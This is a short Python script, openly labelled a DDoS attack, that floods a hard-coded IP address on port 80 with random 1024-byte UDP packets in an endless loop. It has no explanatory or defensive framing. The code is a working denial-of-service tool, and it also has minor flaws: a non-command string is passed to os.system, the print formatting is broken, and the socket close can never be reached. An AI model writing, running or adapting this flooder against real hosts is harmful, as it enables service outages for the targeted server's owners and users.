import sys
import os
import time
import socket
import random
import threading

#Create a datagram and store a payload in it
""" Create a datagram based server socket that uses IPv4 addressing scheme """
datagramSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);
payload = random._urandom(1024);

#targetIP = input("Enter IP address of Target: ");
#targetPort = input("Enter port of Target: ");

#The IP of the server is provided along with the port number
targetIP = "44.228.239.90";
targetPort = 80;

os.system("clear");
os.system("DDOS Attack is Starting");

packetIP = 0;

#Keep sending datagram to the server IP through the provided port until interrupt by ctrl + c
while True:
        datagramSocket.sendto(payload, (targetIP, targetPort));

        packetIP = packetIP + 1;
        print("Packet ", packetIP, " was sent throught port %s", targetPort);

datagramSocket.close();
